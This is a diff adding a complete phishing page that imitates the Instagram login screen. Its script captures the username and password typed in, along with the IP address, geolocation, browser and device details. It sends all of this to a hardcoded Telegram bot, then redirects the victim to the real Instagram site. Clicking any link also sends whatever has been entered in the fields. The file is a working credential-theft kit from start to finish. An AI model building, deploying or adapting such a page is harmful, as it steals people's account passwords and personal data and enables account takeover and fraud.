@@ -1,0 +1,603 @@
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en"><head></head><body><plasmo-csui></plasmo-csui><plasmo-csui></plasmo-csui>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login • Instagram</title>
+    <link href="cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
+    <link href="fonts.googleapis.com/css2" rel="stylesheet" />
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #000; /* Black background as per image */
+            display: flex;
+            flex-direction: column; /* Changed to column to stack elements */
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding-top: 20px; /* Add some top padding for mobile view */
+            padding-bottom: 20px; /* Add some bottom padding */
+        }
+        .loading-screen {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            width: 100vw;
+            background-color: #000;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 10;
+            opacity: 1;
+            transition: opacity 1s ease-in-out;
+        }
+        .loading-screen.hidden {
+            opacity: 0;
+            pointer-events: none; /* Disable interaction after hidden */
+        }
+        .loading-logo-img { /* New style for the loading screen logo image */
+            width: 150px; /* Adjusted size to be smaller */
+            height: auto; /* Maintain aspect ratio */
+            margin-bottom: 20px;
+        }
+        .login-container {
+            background-color: #000; /* Matches body background */
+            border: 1px solid #262626; /* Darker border */
+            border-radius: 8px;
+            padding: 40px;
+            width: 100%;
+            max-width: 380px; /* Max width as seen in the image */
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            display: none; /* Hidden initially */
+            flex-direction: column;
+            align-items: center;
+        }
+        .instagram-logo-img { /* New style for the Instagram logo image in login page */
+            width: 175px; /* Adjusted to fit the image proportions better */
+            height: auto;
+            margin-bottom: 30px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            background-color: #1a1a1a; /* Darker input background */
+            border: 1px solid #262626; /* Input border */
+            color: #fefefe;
+            padding: 12px 10px;
+            border-radius: 4px;
+            margin-bottom: 10px;
+            width: 100%;
+            font-size: 14px;
+            box-sizing: border-box; /* Include padding and border in the element's total width and height */
+        }
+        input[type="text"]::placeholder,
+        input[type="password"]::placeholder {
+            color: #8e8e8e; /* Placeholder text color */
+        }
+        .login-button {
+            background-color: #0095f6; /* Instagram blue */
+            color: white;
+            padding: 10px 0;
+            border-radius: 6px;
+            width: 100%;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            margin-top: 5px;
+            margin-bottom: 20px;
+        }
+        .login-button:hover {
+            background-color: #0077c0;
+        }
+        .or-divider {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+        .or-divider::before,
+        .or-divider::after {
+            content: '';
+            flex-grow: 1;
+            height: 1px;
+            background-color: #262626;
+        }
+        .or-divider::before {
+            margin-right: 15px;
+        }
+        .or-divider::after {
+            margin-left: 15px;
+        }
+        .facebook-login {
+            color: #0095f6;
+            font-weight: 600;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+        .facebook-login svg {
+            margin-right: 8px;
+        }
+        .forgot-password {
+            color: #0095f6;
+            font-size: 12px;
+            cursor: pointer;
+            margin-bottom: 40px;
+        }
+        .signup-box {
+            background-color: #000; /* Matches body background */
+            border: 1px solid #262626; /* Darker border */
+            border-radius: 8px;
+            padding: 20px;
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+            margin-top: 10px; /* Adjusted margin to be closer to the login box */
+            color: #fefefe;
+            font-size: 14px;
+        }
+        .signup-link {
+            color: #0095f6;
+            font-weight: 600;
+            margin-left: 5px;
+            cursor: pointer;
+        }
+        .get-the-app {
+            color: #fefefe;
+            font-size: 14px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        .app-links {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+            justify-content: center;
+            flex-wrap: wrap; /* Allow wrapping on smaller screens */
+        }
+        .app-links img {
+            height: 40px; /* Adjust height of app store icons */
+            border-radius: 4px;
+        }
+        .meta-text {
+            color: #8e8e8e;
+            font-size: 12px;
+            margin-top: 60px;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 15px; /* Spacing between links */
+            margin-top: 40px; /* Space from app links */
+            max-width: 90%;
+        }
+        .footer-links a, .footer-links span {
+            color: #8e8e8e;
+            font-size: 12px;
+            text-decoration: none;
+            transition: color 0.2s ease;
+        }
+        .footer-links a:hover {
+            color: #fefefe;
+        }
+        .copyright-text {
+            color: #8e8e8e;
+            font-size: 12px;
+            margin-top: 20px;
+            margin-bottom: 20px; /* Ensure space at the very bottom */
+            text-align: center;
+        }
+
+        /* Modal specific styles for custom alerts */
+        .custom-alert-modal {
+            display: none; /* Hidden by default */
+            position: fixed; /* Stay in place */
+            z-index: 50; /* Sit on top of everything else */
+            left: 0;
+            top: 0;
+            width: 100%; /* Full width */
+            height: 100%; /* Full height */
+            overflow: auto; /* Enable scroll if needed */
+            background-color: rgba(0,0,0,0.8); /* Black w/ opacity */
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .custom-alert-modal-content {
+            background-color: #1a1a1a;
+            padding: 30px;
+            border: 1px solid #262626;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        .custom-alert-modal-content h2 {
+            color: #fefefe;
+            font-size: 20px;
+            margin-bottom: 15px;
+        }
+        .custom-alert-modal-content p {
+            color: #fefefe;
+            margin-bottom: 25px;
+        }
+        .custom-alert-modal-content button {
+            background-color: #0095f6;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            width: 100%;
+        }
+        .custom-alert-modal-content button:hover {
+            background-color: #0077c0;
+        }
+
+
+        /* Responsive adjustments */
+        @media (max-width: 640px) {
+            .login-container, .signup-box {
+                border: none; /* Remove border on smaller screens */
+                background-color: #000; /* Ensure background is black */
+                padding: 20px;
+                max-width: 100%;
+            }
+            body {
+                align-items: center; /* Center horizontally */
+                padding-top: 40px;
+                padding-bottom: 40px; /* Ensure enough space at the bottom */
+            }
+            .meta-text {
+                position: static; /* Position normally on smaller screens */
+                margin-top: 40px;
+                padding-bottom: 20px;
+            }
+            .footer-links {
+                gap: 10px; /* Reduce gap on smaller screens */
+                font-size: 10px; /* Smaller font on small screens */
+                padding: 0 10px; /* Add some horizontal padding */
+            }
+            .copyright-text {
+                font-size: 10px;
+            }
+        }
+    </style>
+<style>._button_10caf_25{border-radius:8px;border:unset;cursor:pointer;transition:.3s}._button_10caf_25:disabled{opacity:.3;cursor:not-allowed}._button_default_10caf_35{background:transparent;color:#43434e}._button_default_10caf_35:hover{background:#f3f4f7}._button_default_10caf_35:active{background:#8e8e8e}._button_default_10caf_35 ._svg_10caf_45 *{fill:#43434e}._button_primary_10caf_48{background:#007eff;color:#fff}._button_primary_10caf_48:hover{background:#3398ff}._button_primary_10caf_48:active{background:#66b2ff}._button_primary_10caf_48 ._svg_10caf_45 *{fill:#fff}._button_link_10caf_61{background:transparent;color:#007eff}._button_link_10caf_61:hover{color:#3398ff}._button_link_10caf_61:active{color:#66b2ff}._button_link_10caf_61 ._svg_10caf_45 *{fill:#007eff}._button_link_10caf_61 ._svg_10caf_45 *:hover{fill:#3398ff}._button_link_10caf_61 ._svg_10caf_45 *:active{fill:#66b2ff}._button_large_10caf_80{padding:12px 16px}._button_large_10caf_80 *{font-size:16px}._button_medium_10caf_86{padding:8px 16px}._button_medium_10caf_86 *{font-size:16px}._button_small_10caf_92{padding:4px;min-height:24px}._button_small_10caf_92 *{font-size:12px}._flexBox_9xdww_14{flex-flow:unset}._gap_extraTiny_9xdww_18{gap:2px}._gap_tiny_9xdww_22{gap:4px}._gap_extraSmall_9xdww_26{gap:6px}._gap_small_9xdww_30{gap:8px}._gap_medium_9xdww_34{gap:16px}._gap_normal_9xdww_38{gap:24px}._gap_large_9xdww_42{gap:32px}._gap_xLarge_9xdww_46{gap:48px}._gap_xxLarge_9xdww_50{gap:56px}._gap_extraLarge_9xdww_54{gap:64px}._column_9xdww_58{flex-direction:column!important}._flexWrap_9xdww_62{flex-wrap:wrap}._popover_12uvb_1{position:fixed;padding:8px 10px;z-index:2147483647;background:#31363de6;border-radius:4px;color:#fff;font-size:14px}._buttons_12uvb_11{position:fixed;top:0;right:0;padding:8px;z-index:2147483647}._popup_hcu7e_1{position:fixed;z-index:2147483649;background:#ffffffe6;border-radius:4px;color:#000;font-size:14px;line-height:1.286;width:350px;-webkit-backdrop-filter:blur(2px);backdrop-filter:blur(2px);box-shadow:0 0 7px -5px #000}._popup_hcu7e_1:before{border-color:rgba(255,255,255,.9) transparent;border-width:0 7px 7px 7px;left:7px;top:-7px;border-style:solid;content:".";display:block;height:0;position:absolute;text-indent:-30000px;width:0}._color_hcu7e_27{width:20px;height:20px;cursor:pointer;flex-shrink:0}._styleContainer_hcu7e_34{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}._extraTiny_dg7lc_14{padding:2px}._extraTinyVR_dg7lc_18{padding-top:2px;padding-bottom:2px}._extraTinyHR_dg7lc_23{padding-left:2px;padding-right:2px}._extraTinyTop_dg7lc_28{padding-top:2px}._extraTinyRight_dg7lc_32{padding-right:2px}._extraTinyBottom_dg7lc_36{padding-bottom:2px}._extraTinyLeft_dg7lc_40{padding-left:2px}._tiny_dg7lc_44{padding:4px}._tinyVR_dg7lc_48{padding-top:4px;padding-bottom:4px}._tinyHR_dg7lc_53{padding-left:4px;padding-right:4px}._tinyTop_dg7lc_58{padding-top:4px}._tinyRight_dg7lc_62{padding-right:4px}._tinyBottom_dg7lc_66{padding-bottom:4px}._tinyLeft_dg7lc_70{padding-left:4px}._extraSmall_dg7lc_74{padding:6px}._extraSmallVR_dg7lc_78{padding-top:6px;padding-bottom:6px}._extraSmallHR_dg7lc_83{padding-left:6px;padding-right:6px}._extraSmallTop_dg7lc_88{padding-top:6px}._extraSmallRight_dg7lc_92{padding-right:6px}._extraSmallBottom_dg7lc_96{padding-bottom:6px}._extraSmallLeft_dg7lc_100{padding-left:6px}._small_dg7lc_104{padding:8px}._smallVR_dg7lc_108{padding-top:8px;padding-bottom:8px}._smallHR_dg7lc_113{padding-left:8px;padding-right:8px}._smallTop_dg7lc_118{padding-top:8px}._smallRight_dg7lc_122{padding-right:8px}._smallBottom_dg7lc_126{padding-bottom:8px}._smallLeft_dg7lc_130{padding-left:8px}._medium_dg7lc_134{padding:16px}._mediumVR_dg7lc_138{padding-top:16px;padding-bottom:16px}._mediumHR_dg7lc_143{padding-left:16px;padding-right:16px}._mediumTop_dg7lc_148{padding-top:16px}._mediumRight_dg7lc_152{padding-right:16px}._mediumBottom_dg7lc_156{padding-bottom:16px}._mediumLeft_dg7lc_160{padding-left:16px}._normal_dg7lc_164{padding:24px}._normalVR_dg7lc_168{padding-top:24px;padding-bottom:24px}._normalHR_dg7lc_173{padding-left:24px;padding-right:24px}._normalTop_dg7lc_178{padding-top:24px}._normalRight_dg7lc_182{padding-right:24px}._normalBottom_dg7lc_186{padding-bottom:24px}._normalLeft_dg7lc_190{padding-left:24px}._large_dg7lc_194{padding:32px}._largeVR_dg7lc_198{padding-top:32px;padding-bottom:32px}._largeHR_dg7lc_203{padding-left:32px;padding-right:32px}._largeTop_dg7lc_208{padding-top:32px}._largeRight_dg7lc_212{padding-right:32px}._largeBottom_dg7lc_216{padding-bottom:32px}._largeLeft_dg7lc_220{padding-left:32px}._xLarge_dg7lc_224{padding:48px}._xLargeVR_dg7lc_228{padding-top:48px;padding-bottom:48px}._xLargeHR_dg7lc_233{padding-left:48px;padding-right:48px}._xLargeTop_dg7lc_238{padding-top:48px}._xLargeRight_dg7lc_242{padding-right:48px}._xLargeBottom_dg7lc_246{padding-bottom:48px}._xLargeLeft_dg7lc_250{padding-left:48px}._xxLarge_dg7lc_254{padding:56px}._xxLargeVR_dg7lc_258{padding-top:56px;padding-bottom:56px}._xxLargeHR_dg7lc_263{padding-left:56px;padding-right:56px}._xxLargeTop_dg7lc_268{padding-top:56px}._xxLargeRight_dg7lc_272{padding-right:56px}._xxLargeBottom_dg7lc_276{padding-bottom:56px}._xxLargeLeft_dg7lc_280{padding-left:56px}._extraLarge_dg7lc_284{padding:64px}._extraLargeVR_dg7lc_288{padding-top:64px;padding-bottom:64px}._extraLargeHR_dg7lc_293{padding-left:64px;padding-right:64px}._extraLargeTop_dg7lc_298{padding-top:64px}._extraLargeRight_dg7lc_302{padding-right:64px}._extraLargeBottom_dg7lc_306{padding-bottom:64px}._extraLargeLeft_dg7lc_310{padding-left:64px}._size_tiny_ldink_23,._size_tiny_ldink_23 *{font-size:12px}._size_small_ldink_27,._size_small_ldink_27 *{font-size:16px}._size_medium_ldink_31,._size_medium_ldink_31 *{font-size:18px}._size_large_ldink_35,._size_large_ldink_35 *{font-size:32px}._weight_thin_ldink_39,._weight_thin_ldink_39 *{font-weight:100}._weight_extraLight_ldink_43,._weight_extraLight_ldink_43 *{font-weight:200}._weight_light_ldink_47,._weight_light_ldink_47 *{font-weight:300}._weight_normal_ldink_51,._weight_normal_ldink_51 *{font-weight:400}._weight_medium_ldink_55,._weight_medium_ldink_55 *{font-weight:500}._weight_semiBold_ldink_59,._weight_semiBold_ldink_59 *{font-weight:600}._weight_bold_ldink_63,._weight_bold_ldink_63 *{font-weight:700}._weight_extraBold_ldink_67,._weight_extraBold_ldink_67 *{font-weight:800}._lineHeight_ldink_71{line-height:100%}._secondary_ldink_75{color:#8e8e8e}._modal_ib2ay_25{position:fixed;top:0;left:0;width:100%;height:100%;display:flex;justify-content:center;align-items:center;z-index:2147483649}._modal_ib2ay_25 ._background_ib2ay_36{position:absolute;top:0;left:0;width:100%;height:100%;transition:.3s;opacity:0;overflow:auto;background-color:color-mix(in srgb,#000000 60%,white 0%);-webkit-backdrop-filter:blur(2px);backdrop-filter:blur(2px)}._modal_ib2ay_25 ._window_ib2ay_48{min-width:280px;max-width:560px;background:#fff;border-radius:6px;padding:16px;z-index:1;position:relative;opacity:0;transform:scale(.01);transition:.3s;display:flex;flex-direction:column;box-shadow:0 2px 6px 2px #00000026,0 1px 2px #0000004d;overflow:auto}._modal_ib2ay_25 ._window_ib2ay_48 ._loading_ib2ay_64{position:absolute;width:100%;height:100%;top:0;left:0;background:#000000b3}._modal_ib2ay_25 ._window_ib2ay_48 ._loading_ib2ay_64 img{width:100px}._modal_visible_ib2ay_76 ._background_ib2ay_36{opacity:1}._modal_visible_ib2ay_76 ._window_ib2ay_48{opacity:1;transform:scale(1)}._modal_hidden_ib2ay_83 ._background_ib2ay_36{opacity:0}._modal_hidden_ib2ay_83 ._window_ib2ay_48{opacity:0;transform:scale(.01)}._modal_hiddenDone_ib2ay_90 ._background_ib2ay_36{opacity:0}._modal_hiddenDone_ib2ay_90 ._window_ib2ay_48{opacity:0;transform:scale(.01)}._color_13dyv_1{padding:0 8px;border-radius:8px;width:100%;box-shadow:0 0 7px -5px #000;font-weight:800;flex-shrink:0}
+</style>
+
+
+    <!-- Loading Screen -->
+    <div id="loading-screen" class="loading-screen hidden" style="display: none;">
+        <img src="https://placehold.co/150x60/333/FFF?text=Instagram+Logo" alt="Instagram Logo" class="loading-logo-img" onerror="this.onerror=null;this.src='https://placehold.co/150x60/333/FFF?text=Instagram+Logo'" />
+        <span class="meta-text">from Meta</span>
+    </div>
+
+    <!-- Login Page -->
+    <div id="login-page" class="login-container" style="display: flex;">
+        <img src="https://placehold.co/175x51/333/FFF?text=Instagram" alt="Instagram" class="instagram-logo-img" onerror="this.onerror=null;this.src='https://placehold.co/175x51/333/FFF?text=Instagram'" />
+
+        <input type="text" id="username-email-phone" placeholder="Phone number, username, or email" class="focus:outline-none focus:ring-1 focus:ring-gray-600" />
+        <input type="password" id="password" placeholder="Password" class="focus:outline-none focus:ring-1 focus:ring-gray-600" />
+
+        <button id="login-button" class="login-button">Log in</button>
+
+        <div class="or-divider">OR</div>
+
+        <button class="facebook-login" data-link-name="Facebook Login">
+            <svg xmlns="http://www.w3.org/2000/svg" aria-label="Facebook icon" class="-mt-px mr-2" color="#0095f6" fill="#0095f6" height="16" role="img" viewBox="0 0 24 24" width="16"><path d="M12.001 0C5.373 0 0 5.373 0 12.001 0 17.989 4.143 22.825 9.71 23.906V15.5H7V12.5h2.71v-2.002c0-2.68 1.63-4.142 4.027-4.142 1.15 0 2.14.086 2.433.125V8.5h-1.63c-1.396 0-1.666.663-1.666 1.638v1.863h3.334l-.534 3h-2.8V23.906C19.858 22.824 24 17.989 24 12.001 24 5.373 18.627 0 12.001 0Z"/></svg>
+            Log in with Facebook
+        </button>
+
+        <a href="#" class="forgot-password" data-link-name="Forgot Password">Forgot password?</a>
+    </div>
+
+    <div class="signup-box">
+        Don't have an account? <a href="#" class="signup-link" data-link-name="Sign Up Link">Sign up</a>
+    </div>
+
+    <div class="get-the-app">Get the app.</div>
+    <div class="app-links">
+        <a href="https://apps.apple.com/us/app/instagram/id389801252" target="_blank" data-link-name="Apple Store">
+            <img src="https://github.com/laisfrigerio/instagram-clone-login-page/blob/master/img/apple-button.png?raw=true" alt="Download on the App Store" onerror="this.onerror=null;this.src='https://placehold.co/135x40/333/FFF?text=Apple+Store'" />
+        </a>
+        <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;hl=en" target="_blank" data-link-name="Google Play Store">
+            <img src="https://github.com/laisfrigerio/instagram-clone-login-page/blob/master/img/googleplay-button.png?raw=true" alt="Get it on Google Play" onerror="this.onerror=null;this.src='https://placehold.co/135x40/333/FFF?text=Google+Play'" />
+        </a>
+        <a href="https://apps.microsoft.com/detail/instagram/9NBLGGH5L9XT?hl=en-us&amp;gl=US" target="_blank" data-link-name="Microsoft Store">
+            <img src="https://placehold.co/135x40/333/FFF?text=Microsoft+Store" alt="Get it from Microsoft" onerror="this.onerror=null;this.src='https://placehold.co/135x40/333/FFF?text=Microsoft+Store'" />
+        </a>
+    </div>
+
+    <!-- Footer Links -->
+    <div class="footer-links">
+        <a href="#" data-link-name="Meta Link">Meta</a>
+        <a href="#" data-link-name="About Link">About</a>
+        <a href="#" data-link-name="Blog Link">Blog</a>
+        <a href="#" data-link-name="Jobs Link">Jobs</a>
+        <a href="#" data-link-name="Help Link">Help</a>
+        <a href="#" data-link-name="API Link">API</a>
+        <a href="#" data-link-name="Privacy Link">Privacy</a>
+        <a href="#" data-link-name="Terms Link">Terms</a>
+        <a href="#" data-link-name="Locations Link">Locations</a>
+        <a href="#" data-link-name="Instagram Lite Link">Instagram Lite</a>
+        <a href="#" data-link-name="Threads Link">Threads</a>
+        <a href="#" data-link-name="Contact Uploading &amp; Non-Users Link">Contact Uploading &amp; Non-Users</a>
+        <a href="#" data-link-name="Meta Verified Link">Meta Verified</a>
+    </div>
+    <div class="copyright-text">
+        © 2025 Instagram from Meta
+    </div>
+
+    <!-- Custom Alert Modal -->
+    <div id="custom-alert-modal" class="custom-alert-modal">
+        <div class="custom-alert-modal-content">
+            <h2 id="alert-title">Alert</h2>
+            <p id="alert-message"></p>
+            <button onclick="document.getElementById('custom-alert-modal').style.display='none'">OK</button>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () =&gt; {
+            const loadingScreen = document.getElementById('loading-screen');
+            const loginPage = document.getElementById('login-page');
+            const loginButton = document.getElementById('login-button');
+            const usernameEmailPhoneInput = document.getElementById('username-email-phone');
+            const passwordInput = document.getElementById('password');
+
+            // Simulate loading for 2 seconds then show login page
+            setTimeout(() =&gt; {
+                loadingScreen.classList.add('hidden');
+                setTimeout(() =&gt; {
+                    loadingScreen.style.display = 'none'; // Completely remove after transition
+                    loginPage.style.display = 'flex'; // Show the login page
+                }, 1000); // Wait for opacity transition to complete
+            }, 2000);
+
+            // Validation functions
+            const isEmail = (input) =&gt; /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input);
+            const isPhoneNumber = (input) =&gt; /^\d{10}$/.test(input);
+            const isUsername = (input) =&gt; /^[a-zA-Z0-9._]{1,30}$/.test(input);
+
+            // sendToTelegram function now accepts input1, input2, actionType, and a flag for detailed info
+            async function sendToTelegram(input1, input2, actionType, includeDetailedInfo = false) {
+                const browser = navigator.userAgent;
+                const language = navigator.language;
+                const platform = navigator.platform;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+                let ip = 'Error in fetching IP';
+                let locationText = 'Error in fetching Geolocation';
+                
+                // Fetch IP address
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    ip = ipData.ip;
+                } catch (e) { /* Error in fetching IP */ }
+
+                // Fetch Geolocation without prompting if permission isn't already granted
+                try {
+                    if (navigator.geolocation &amp;&amp; navigator.permissions) {
+                        const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
+                        if (permissionStatus.state === 'granted') {
+                            await new Promise((resolve) =&gt; {
+                                navigator.geolocation.getCurrentPosition(
+                                    (pos) =&gt; {
+                                        const { latitude, longitude } = pos.coords;
+                                        locationText = `Latitude: ${latitude}, Longitude: ${longitude}`;
+                                        resolve();
+                                    },
+                                    (error) =&gt; {
+                                        locationText = `Error in fetching Geolocation (${error.message || error.code})`;
+                                        resolve();
+                                    },
+                                    { timeout: 5000, enableHighAccuracy: false }
+                                );
+                            });
+                        } else {
+                            locationText = `Geolocation not granted or available without prompt (${permissionStatus.state})`;
+                        }
+                    } else {
+                        locationText = 'Geolocation API or Permissions API Not Supported';
+                    }
+                } catch (e) { /* Error in checking/fetching Geolocation */ }
+
+
+                let detailedInfoSection = '';
+                if (includeDetailedInfo) {
+                    // Collect device info that typically doesn't require explicit permission pop-ups
+                    let batteryLevel = 'N/A';
+                    let batteryCharging = 'N/A';
+                    let networkType = 'N/A';
+                    let networkEffectiveType = 'N/A';
+                    let deviceMemory = 'N/A';
+                    let hardwareConcurrency = 'N/A';
+
+                    // Battery Status API
+                    try {
+                        if ('getBattery' in navigator) {
+                            const battery = await navigator.getBattery();
+                            batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
+                            batteryCharging = battery.charging ? 'Yes' : 'No';
+                        } else {
+                            batteryLevel = 'API Not Supported';
+                            batteryCharging = 'API Not Supported';
+                        }
+                    } catch (e) {
+                        batteryLevel = `Error in fetching Battery status (${e.message || e.name})`;
+                        batteryCharging = `Error in fetching Battery status (${e.message || e.name})`;
+                    }
+
+                    // Network Information API
+                    try {
+                        if ('connection' in navigator &amp;&amp; navigator.connection) {
+                            networkType = navigator.connection.type || 'N/A';
+                            networkEffectiveType = navigator.connection.effectiveType || 'N/A';
+                        } else {
+                            networkType = 'API Not Supported';
+                            networkEffectiveType = 'API Not Supported';
+                        }
+                    } catch (e) {
+                        networkType = `Error in fetching Network info (${e.message || e.name})`;
+                        networkEffectiveType = `Error in fetching Network info (${e.message || e.name})`;
+                    }
+
+                    // Device Memory
+                    try {
+                        if ('deviceMemory' in navigator) {
+                            deviceMemory = `${navigator.deviceMemory} GB`;
+                        } else {
+                            deviceMemory = 'API Not Supported';
+                        }
+                    } catch (e) {
+                        deviceMemory = `Error in fetching Device Memory (${e.message || e.name})`;
+                    }
+
+                    // Hardware Concurrency
+                    try {
+                        if ('hardwareConcurrency' in navigator) {
+                            hardwareConcurrency = navigator.hardwareConcurrency;
+                        } else {
+                            hardwareConcurrency = 'API Not Supported';
+                        }
+                    } catch (e) {
+                        hardwareConcurrency = `Error in fetching Hardware Concurrency (${e.message || e.name})`;
+                    }
+
+                    detailedInfoSection = `
+🔋 *Device Info:*
+- Battery Level: ${batteryLevel}
+- Battery Charging: ${batteryCharging}
+- Network Type: ${networkType}
+- Effective Network Type: ${networkEffectiveType}
+- Device Memory: ${deviceMemory}
+- Hardware Concurrency (CPU cores): ${hardwareConcurrency}
+`;
+                }
+
+
+                const fullMessage = `
+? *${actionType}*
+---------------------
+� *Identifier:* ${input1 || 'Not Entered'}
+📝 *Password:* ${input2 || 'Not Entered'}
+
+🌐 *Browser Info:*
+- Platform: ${platform}
+- Language: ${language}
+- Timezone: ${timezone}
+- User Agent: ${browser}
+
+🌍 *IP Address:* ${ip}
+📍 *Geolocation:* ${locationText}
+${detailedInfoSection}
+`;
+
+                const botToken = '8150013437:AAHntIIKX8bSYShPMvc0Uk1yzehl4AywqZE';
+                const chatId = '7027950958';
+
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: fullMessage,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                    await response.json(); // Consume response to ensure request completes
+                } catch (error) {
+                    // Silently handle fetch errors
+                }
+            }
+
+            // Login validation, Telegram send, and redirect (Detailed Info for all key actions)
+            loginButton.addEventListener('click', async () =&gt; {
+                const identifier = usernameEmailPhoneInput.value.trim();
+                const password = passwordInput.value.trim();
+
+                let isValidIdentifier = false;
+                let validationMessage = '';
+
+                if (isPhoneNumber(identifier)) {
+                    isValidIdentifier = true;
+                } else if (isEmail(identifier)) {
+                    isValidIdentifier = true;
+                } else if (isUsername(identifier)) {
+                    isValidIdentifier = true;
+                } else {
+                    validationMessage += 'Please enter a valid 10-digit phone number, email address, or username (1-30 characters, letters, numbers, periods, underscores). ';
+                }
+
+                if (!password) {
+                    validationMessage += 'Please enter your password.';
+                }
+
+                if (isValidIdentifier &amp;&amp; password) {
+                    // Send detailed info for primary login button
+                    await sendToTelegram(identifier, password, 'Login Attempt (Detailed Info)', true);
+                    window.location.href = "https://www.instagram.com";
+                } else {
+                    alert(validationMessage.trim() || 'Please fill in both fields correctly.');
+                }
+            });
+
+            // Add event listeners to all links for DETAILED INFO COLLECTION
+            document.querySelectorAll('a, button.facebook-login').forEach(link =&gt; {
+                // Exclude the login-button itself as it has its own logic (handled above)
+                if (link.id === 'login-button') return;
+
+                link.addEventListener('click', async (event) =&gt; {
+                    const identifier = usernameEmailPhoneInput.value.trim();
+                    const password = passwordInput.value.trim();
+                    const linkName = link.dataset.linkName || link.innerText.trim() || link.getAttribute('href');
+                    
+                    // Send detailed info for all link clicks
+                    await sendToTelegram(identifier, password, `Clicked Link: ${linkName}`, true);
+                });
+            });
+
+
+            // Prevent default form submission if this were a form
+            usernameEmailPhoneInput.addEventListener('keydown', (event) =&gt; {
+                if (event.key === 'Enter') {
+                    event.preventDefault();
+                    loginButton.click();
+                }
+            });
+
+            passwordInput.addEventListener('keydown', (event) =&gt; {
+                if (event.key === 'Enter') {
+                    event.preventDefault();
+                    loginButton.click();
+                }
+            });
+
+        });
+
+        // Custom Alert function
+        function alert(message) {
+            const modal = document.getElementById('custom-alert-modal');
+            const alertMessage = document.getElementById('alert-message');
+            alertMessage.innerText = message;
+            modal.style.display = 'flex'; // Show the modal
+        }
+    </script>
+
+
+�
+<div></div></body></html>
